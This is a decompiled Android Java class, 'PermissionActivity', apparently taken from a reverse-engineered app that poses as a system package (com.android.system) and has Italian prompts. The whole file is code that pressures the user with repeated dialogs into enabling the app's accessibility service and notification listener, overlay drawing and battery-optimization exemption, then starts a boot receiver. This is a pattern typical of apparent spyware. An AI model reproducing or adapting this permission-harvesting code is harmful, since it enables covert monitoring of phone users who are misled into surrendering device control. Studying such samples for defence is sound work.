package com.android.system;

import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.provider.Settings.Secure;
import android.provider.Settings.SettingNotFoundException;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.e;
import com.app.system.common.h;
import com.app.system.common.service.NotificationListener;
import com.security.d.a;

public class PermissionActivity
  extends e
{
  static int a = 0;
  static int b = 0;
  static boolean c = false;
  private String[] d;
  
  public static boolean a(Context paramContext)
  {
    Object localObject1 = new StringBuilder();
    ((StringBuilder)localObject1).append(paramContext.getPackageName());
    ((StringBuilder)localObject1).append("/");
    ((StringBuilder)localObject1).append(MyAccessibilityService.class.getCanonicalName());
    localObject1 = ((StringBuilder)localObject1).toString();
    try
    {
      int i = Settings.Secure.getInt(paramContext.getApplicationContext().getContentResolver(), "accessibility_enabled");
      Object localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      ((StringBuilder)localObject2).append("Accessibility enabled = ");
      ((StringBuilder)localObject2).append(i);
      a.d("PermissionActivity", ((StringBuilder)localObject2).toString(), new Object[0]);
      if (i == 1)
      {
        paramContext = Settings.Secure.getString(paramContext.getApplicationContext().getContentResolver(), "enabled_accessibility_services");
        if (paramContext != null) {
          for (String str : paramContext.split("[:;]"))
          {
            paramContext = new StringBuilder();
            paramContext.append("Accessibility Service abilitato: ");
            paramContext.append(str);
            a.d("PermissionActivity", paramContext.toString(), new Object[0]);
            if (str.equalsIgnoreCase((String)localObject1))
            {
              a.d("PermissionActivity", "Il nostro Accessibility Service è abilitato!", new Object[0]);
              return true;
            }
          }
        }
      }
      return false;
    }
    catch (Settings.SettingNotFoundException paramContext)
    {
      a.d("PermissionActivity", "Errore controllo Accessibility", new Object[] { paramContext });
    }
    return false;
  }
  
  public static boolean b(Context paramContext)
  {
    if (Build.VERSION.SDK_INT >= 22)
    {
      Object localObject1 = new StringBuilder();
      ((StringBuilder)localObject1).append(paramContext.getPackageName());
      ((StringBuilder)localObject1).append("/");
      ((StringBuilder)localObject1).append(NotificationListener.class.getCanonicalName());
      localObject1 = ((StringBuilder)localObject1).toString();
      Object localObject2 = new ComponentName(paramContext, NotificationListener.class);
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("myService=");
      localStringBuilder.append((String)localObject1);
      a.e("PermissionActivity", localStringBuilder.toString(), new Object[0]);
      localStringBuilder = new StringBuilder();
      localStringBuilder.append("compName=");
      localStringBuilder.append(localObject2);
      a.e("PermissionActivity", localStringBuilder.toString(), new Object[0]);
      paramContext = Settings.Secure.getString(paramContext.getApplicationContext().getContentResolver(), "enabled_notification_listeners");
      if (paramContext != null)
      {
        localObject2 = new StringBuilder();
        ((StringBuilder)localObject2).append("listeners enabled: ");
        ((StringBuilder)localObject2).append(paramContext);
        a.e("PermissionActivity", ((StringBuilder)localObject2).toString(), new Object[0]);
        for (paramContext : paramContext.split("[:;]"))
        {
          localStringBuilder = new StringBuilder();
          localStringBuilder.append("Notification Listener abilitato: ");
          localStringBuilder.append(paramContext);
          a.d("PermissionActivity", localStringBuilder.toString(), new Object[0]);
          if (paramContext.equalsIgnoreCase((String)localObject1))
          {
            a.d("PermissionActivity", "Il nostro Notification Listener è abilitato!", new Object[0]);
            return true;
          }
        }
      }
      ??? = b;
      if (??? > 3) {
        return true;
      }
      b = ??? + 1;
      return false;
    }
    return true;
  }
  
  public static boolean c(Context paramContext)
  {
    if (Build.VERSION.SDK_INT >= 23)
    {
      Context localContext = paramContext.getApplicationContext();
      paramContext = localContext.getPackageName();
      boolean bool = ((PowerManager)localContext.getSystemService("power")).isIgnoringBatteryOptimizations(paramContext);
      if (!bool)
      {
        int i = a;
        if (i > 3) {
          return true;
        }
        a = i + 1;
      }
      return bool;
    }
    return true;
  }
  
  private void f()
  {
    Object localObject = getSharedPreferences("pref", 0);
    if (((SharedPreferences)localObject).getBoolean("init-msg-shown", false))
    {
      finish();
    }
    else
    {
      h.a(this, "Inizializzazione completata", "Ora potrai fruire dei servizi richiesti", new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          paramAnonymousDialogInterface.dismiss();
          PermissionActivity.this.finish();
        }
      });
      localObject = ((SharedPreferences)localObject).edit();
      ((SharedPreferences.Editor)localObject).putBoolean("init-msg-shown", true);
      ((SharedPreferences.Editor)localObject).commit();
    }
  }
  
  protected void onActivityResult(int paramInt1, int paramInt2, Intent paramIntent)
  {
    if ((paramInt1 == 1233) || (paramInt1 == 1234) || (paramInt1 == 1235) || (paramInt1 == 1236)) {
      h.a(this, "", "Premere OK per proseguire", new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          paramAnonymousDialogInterface.dismiss();
          BootBroadcast.a(PermissionActivity.this.getApplicationContext());
          PermissionActivity.this.finish();
        }
      });
    }
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    if (!a(this))
    {
      paramBundle = new StringBuilder();
      paramBundle.append("Attivare il servizio ");
      paramBundle.append(getResources().getString(2131558441));
      paramBundle.append(" - Accessibility Service per il corretto funzionamento dell'app");
      h.a(this, "Importante", paramBundle.toString(), new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          paramAnonymousDialogInterface.dismiss();
          paramAnonymousDialogInterface = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
          paramAnonymousDialogInterface.addFlags(1342177280);
          PermissionActivity.this.startActivityForResult(paramAnonymousDialogInterface, 1233);
        }
      });
      return;
    }
    this.d = getIntent().getStringArrayExtra("com.system.services.PERMISSIONS");
    ActivityCompat.requestPermissions(this, this.d, 100);
  }
  
  public void onRequestPermissionsResult(int paramInt, String[] paramArrayOfString, int[] paramArrayOfInt)
  {
    super.onRequestPermissionsResult(paramInt, paramArrayOfString, paramArrayOfInt);
    int i = paramArrayOfString.length;
    paramInt = 0;
    if (i == 0)
    {
      a.d("PermissionActivity", "La finestra di richiesta permessi è stata annullata", new Object[0]);
    }
    else
    {
      i = 0;
      paramInt = 1;
      while (i < paramArrayOfString.length)
      {
        int j;
        if (paramArrayOfInt[i] == 0) {
          j = 1;
        } else {
          j = 0;
        }
        StringBuilder localStringBuilder = new StringBuilder();
        localStringBuilder.append(paramArrayOfString[i]);
        localStringBuilder.append(": ");
        String str;
        if (j != 0) {
          str = "GRANTED";
        } else {
          str = "DENIED";
        }
        localStringBuilder.append(str);
        a.d("PermissionActivity", localStringBuilder.toString(), new Object[0]);
        if (j == 0) {
          paramInt = 0;
        }
        i++;
      }
    }
    if (paramInt != 0)
    {
      if (!a(this))
      {
        paramArrayOfString = new StringBuilder();
        paramArrayOfString.append("Attivare il servizio ");
        paramArrayOfString.append(getResources().getString(2131558441));
        paramArrayOfString.append(" - Accessibility Service per il corretto funzionamento dell'app");
        h.a(this, "Importante", paramArrayOfString.toString(), new DialogInterface.OnClickListener()
        {
          public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
          {
            paramAnonymousDialogInterface.dismiss();
            paramAnonymousDialogInterface = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            paramAnonymousDialogInterface.addFlags(1342177280);
            PermissionActivity.this.startActivityForResult(paramAnonymousDialogInterface, 1233);
          }
        });
        return;
      }
      if ((Build.VERSION.SDK_INT >= 22) && (!c) && (!b(this)))
      {
        h.a(this, "Importante", "Attivare il servizio Android Notification System per il corretto funzionamento dell'app", new DialogInterface.OnClickListener()
        {
          public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
          {
            paramAnonymousDialogInterface.dismiss();
            paramAnonymousDialogInterface = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            paramAnonymousDialogInterface.addFlags(1342177280);
            try
            {
              PermissionActivity.this.startActivityForResult(paramAnonymousDialogInterface, 1236);
            }
            catch (ActivityNotFoundException paramAnonymousDialogInterface)
            {
              PermissionActivity.c = true;
              a.b("PermissionActivity", "Notification Listener Settings", new Object[] { paramAnonymousDialogInterface });
            }
          }
        });
        return;
      }
      if (Build.VERSION.SDK_INT >= 23)
      {
        if (!Settings.canDrawOverlays(this))
        {
          h.a(this, "Importante", "Concedere l'autorizzazione al disegno su altre app (overlay) per il corretto funzionamento dell'app", new DialogInterface.OnClickListener()
          {
            public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
            {
              paramAnonymousDialogInterface.dismiss();
              paramAnonymousDialogInterface = new StringBuilder();
              paramAnonymousDialogInterface.append("package:");
              paramAnonymousDialogInterface.append(PermissionActivity.this.getPackageName());
              paramAnonymousDialogInterface = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse(paramAnonymousDialogInterface.toString()));
              PermissionActivity.this.startActivityForResult(paramAnonymousDialogInterface, 1234);
            }
          });
          return;
        }
        if (!c(this))
        {
          h.a(this, "Importante", "Ignorare l'ottimizzazione batteria per il corretto funzionamento dell'app", new DialogInterface.OnClickListener()
          {
            public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
            {
              paramAnonymousDialogInterface.dismiss();
              Intent localIntent = new Intent();
              String str = PermissionActivity.this.getApplicationContext().getPackageName();
              localIntent.setAction("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
              paramAnonymousDialogInterface = new StringBuilder();
              paramAnonymousDialogInterface.append("package:");
              paramAnonymousDialogInterface.append(str);
              localIntent.setData(Uri.parse(paramAnonymousDialogInterface.toString()));
              PermissionActivity.this.startActivityForResult(localIntent, 1235);
            }
          });
          return;
        }
      }
      BootBroadcast.b(getApplicationContext());
      f();
    }
    else
    {
      h.a(this, "Importante", "E' necessario concedere i permessi o l'app non portà funzionare", new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          paramAnonymousDialogInterface.dismiss();
          BootBroadcast.a(PermissionActivity.this.getApplicationContext());
          PermissionActivity.this.finish();
        }
      });
    }
  }
}


/* Location:              ~/com/android/system/PermissionActivity.class
 *
 * Reversed by:           J
 */